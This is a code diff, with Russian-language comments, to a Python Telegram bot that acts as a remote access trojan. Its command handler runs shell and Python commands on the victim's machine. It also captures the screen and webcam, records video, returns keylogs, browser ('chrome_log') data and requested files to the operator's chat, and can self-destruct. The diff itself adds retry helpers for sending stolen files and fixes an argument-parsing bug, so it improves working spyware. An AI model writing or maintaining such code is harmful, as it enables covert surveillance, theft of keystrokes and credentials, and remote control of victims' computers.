@@ -1,5 +1,6 @@
 import re
 import logging
+import os
 from commands import *
 from time import sleep
 
@@ -11,6 +12,24 @@ def send_safe_message(chat_id, message):
             break
         except:
             sleep(1)
+
+
+def send_safe_document(chat_id, file_path):
+    """Безопасная отправка документа с повторными попытками"""
+    while True:
+        try:
+            with open(file_path, 'rb') as f:
+                bot.sendDocument(chat_id, f)
+            break
+        except:
+            sleep(1)
+
+
+def send_file_and_cleanup(chat_id, file_path, response_text=None):
+    """Отправляет файл, удаляет его и возвращает текст ответа"""
+    send_safe_document(chat_id, file_path)
+    os.remove(file_path)
+    return response_text
 
 
 def handle_message(msg):
@@ -56,8 +75,7 @@ def handle_message(msg):
             temp_path = os.path.join(LOG_DIR, 'cmd_output.txt')
             with open(temp_path, 'w', encoding='utf-8') as f:
                 f.write(result)
-            bot.sendDocument(chat_id, open(temp_path, 'rb'))
-            os.remove(temp_path)
+            send_file_and_cleanup(chat_id, temp_path)
             response = result[:700]
 
         elif command.startswith('/python_exec'):
@@ -67,28 +85,24 @@ def handle_message(msg):
             else:
                 path, result = python_exec(code)
                 if path:
-                    bot.sendDocument(chat_id, open(path, 'rb'))
-                    os.remove(path)
+                    send_file_and_cleanup(chat_id, path)
                 else:
                     response = result
 
         elif command == '/capture_pc':
             path, response = capture_pc()
-            bot.sendDocument(chat_id, open(path, 'rb'))
-            os.remove(path)
+            send_file_and_cleanup(chat_id, path)
 
         elif command.startswith('/video_pc'):
             parts = command.replace('/video_pc', '').strip()
             seconds = min(int(parts) if parts else 30, 500)
             path, response = record_screen(seconds)
-            bot.sendDocument(chat_id, open(path, 'rb'))
-            os.remove(path)
+            send_file_and_cleanup(chat_id, path)
 
         elif command == '/capture_webcam':
             path = capture_webcam()
             if path:
-                bot.sendDocument(chat_id, open(path, 'rb'))
-                os.remove(path)
+                send_file_and_cleanup(chat_id, path)
             else:
                 response = 'Ошибка захвата с камеры'
 
@@ -127,7 +141,7 @@ def handle_message(msg):
             path = command.replace('/download', '').strip()
             file_path = download_file(path)
             if file_path:
-                bot.sendDocument(chat_id, open(file_path, 'rb'))
+                send_safe_document(chat_id, file_path)
             else:
                 response = f'Файл не найден: {path}'
 
@@ -150,11 +164,11 @@ def handle_message(msg):
             response = reboot()
 
         elif command == '/keylogs':
-            bot.sendDocument(chat_id, open(KEYLOG_FILE, 'rb'))
+            send_safe_document(chat_id, KEYLOG_FILE)
             get_keylog_file()
 
         elif command == '/user_log':
-            bot.sendDocument(chat_id, open(LOG_FILE, 'rb'))
+            send_safe_document(chat_id, LOG_FILE)
             get_user_log_file()
 
         elif command == '/chrome_log':
@@ -170,11 +184,14 @@ def handle_message(msg):
             self_destruct()
 
         elif command.startswith('/create_more_folders'):
-            parts = command.replace('/move_mouse', '').strip().split()
-            response = create_desktop_folders(int(parts[1]), parts[2], parts[3])
+            parts = command.replace('/create_more_folders', '').strip().split()
+            if len(parts) >= 3:
+                response = create_desktop_folders(int(parts[0]), parts[1], parts[2])
 
     except Exception as e:
         response = f'⚠️ Ошибка: {e}'
 
     if response:
         send_safe_message(chat_id, response)
+
+
